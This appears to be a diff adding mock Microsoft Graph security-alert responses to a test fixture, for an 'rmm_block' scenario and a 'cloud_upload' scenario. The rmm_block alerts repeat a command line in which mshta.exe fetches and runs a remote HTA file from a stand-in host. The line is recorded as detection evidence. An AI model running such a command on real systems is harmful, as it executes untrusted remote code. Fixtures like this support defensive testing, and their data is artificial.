@@ -478,6 +478,220 @@
           }
         ]
       }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "user_principal_name": "pnovak@contoso.com"
+      },
+      "response": {
+        "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+        "value": [
+          {
+            "id": "da637551384411223344_-1188736704",
+            "title": "Script launched by mshta.exe from a remote location",
+            "severity": "informational",
+            "status": "new",
+            "category": "DefenseEvasion",
+            "classification": null,
+            "determination": null,
+            "createdDateTime": "2026-09-14T08:41:31Z",
+            "detectionSource": "microsoftDefenderForEndpoint",
+            "incidentId": "79",
+            "mitreTechniques": [
+              "T1218.005"
+            ],
+            "evidence": [
+              {
+                "@odata.type": "#microsoft.graph.security.deviceEvidence",
+                "deviceDnsName": "ws-fin-0042.contoso.com",
+                "mdeDeviceId": "0b7d3e9a2c5f4816a9e3d1c7b5f2a8e4c6d0b3a1"
+              },
+              {
+                "@odata.type": "#microsoft.graph.security.processEvidence",
+                "processId": 4412,
+                "processCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+                "detectionStatus": "detected",
+                "imageFile": {
+                  "fileName": "mshta.exe",
+                  "filePath": "C:\\Windows\\System32",
+                  "sha256": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "device_name": {
+          "$regex": "(?i)^ws-fin-0042(\\.contoso\\.com)?$"
+        }
+      },
+      "response": {
+        "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+        "value": [
+          {
+            "id": "da637551384411223344_-1188736704",
+            "title": "Script launched by mshta.exe from a remote location",
+            "severity": "informational",
+            "status": "new",
+            "category": "DefenseEvasion",
+            "classification": null,
+            "determination": null,
+            "createdDateTime": "2026-09-14T08:41:31Z",
+            "detectionSource": "microsoftDefenderForEndpoint",
+            "incidentId": "79",
+            "mitreTechniques": [
+              "T1218.005"
+            ],
+            "evidence": [
+              {
+                "@odata.type": "#microsoft.graph.security.deviceEvidence",
+                "deviceDnsName": "ws-fin-0042.contoso.com",
+                "mdeDeviceId": "0b7d3e9a2c5f4816a9e3d1c7b5f2a8e4c6d0b3a1"
+              },
+              {
+                "@odata.type": "#microsoft.graph.security.processEvidence",
+                "processId": 4412,
+                "processCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+                "detectionStatus": "detected",
+                "imageFile": {
+                  "fileName": "mshta.exe",
+                  "filePath": "C:\\Windows\\System32",
+                  "sha256": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "incident_id": "79"
+      },
+      "response": {
+        "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+        "value": [
+          {
+            "id": "da637551384411223344_-1188736704",
+            "title": "Script launched by mshta.exe from a remote location",
+            "severity": "informational",
+            "status": "new",
+            "category": "DefenseEvasion",
+            "classification": null,
+            "determination": null,
+            "createdDateTime": "2026-09-14T08:41:31Z",
+            "detectionSource": "microsoftDefenderForEndpoint",
+            "incidentId": "79",
+            "mitreTechniques": [
+              "T1218.005"
+            ],
+            "evidence": [
+              {
+                "@odata.type": "#microsoft.graph.security.deviceEvidence",
+                "deviceDnsName": "ws-fin-0042.contoso.com",
+                "mdeDeviceId": "0b7d3e9a2c5f4816a9e3d1c7b5f2a8e4c6d0b3a1"
+              },
+              {
+                "@odata.type": "#microsoft.graph.security.processEvidence",
+                "processId": 4412,
+                "processCommandLine": "mshta.exe https://relay.example.net/invoice.hta",
+                "detectionStatus": "detected",
+                "imageFile": {
+                  "fileName": "mshta.exe",
+                  "filePath": "C:\\Windows\\System32",
+                  "sha256": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "user_principal_name": "dlarsen@contoso.com"
+      },
+      "response": {
+        "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+        "value": [
+          {
+            "id": "da637551372200000000_-1188736790",
+            "title": "Unsanctioned cloud app in use: PhotoDrive",
+            "severity": "informational",
+            "status": "resolved",
+            "category": "Discovery",
+            "classification": "informationalExpectedActivity",
+            "determination": "other",
+            "createdDateTime": "2026-09-11T14:02:10Z",
+            "detectionSource": "microsoftDefenderForCloudApps",
+            "incidentId": "83",
+            "mitreTechniques": [],
+            "evidence": [
+              {
+                "@odata.type": "#microsoft.graph.security.userEvidence",
+                "userAccount": {
+                  "userPrincipalName": "dlarsen@contoso.com",
+                  "accountName": "dlarsen"
+                }
+              },
+              {
+                "@odata.type": "#microsoft.graph.security.cloudApplicationEvidence",
+                "appId": 31504,
+                "displayName": "PhotoDrive",
+                "instanceName": "PhotoDrive",
+                "saasAppId": 31504
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "incident_id": "83"
+      },
+      "response": {
+        "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+        "value": [
+          {
+            "id": "da637551372200000000_-1188736790",
+            "title": "Unsanctioned cloud app in use: PhotoDrive",
+            "severity": "informational",
+            "status": "resolved",
+            "category": "Discovery",
+            "classification": "informationalExpectedActivity",
+            "determination": "other",
+            "createdDateTime": "2026-09-11T14:02:10Z",
+            "detectionSource": "microsoftDefenderForCloudApps",
+            "incidentId": "83",
+            "mitreTechniques": [],
+            "evidence": [
+              {
+                "@odata.type": "#microsoft.graph.security.userEvidence",
+                "userAccount": {
+                  "userPrincipalName": "dlarsen@contoso.com",
+                  "accountName": "dlarsen"
+                }
+              },
+              {
+                "@odata.type": "#microsoft.graph.security.cloudApplicationEvidence",
+                "appId": 31504,
+                "displayName": "PhotoDrive",
+                "instanceName": "PhotoDrive",
+                "saasAppId": 31504
+              }
+            ]
+          }
+        ]
+      }
     }
   ]
 }
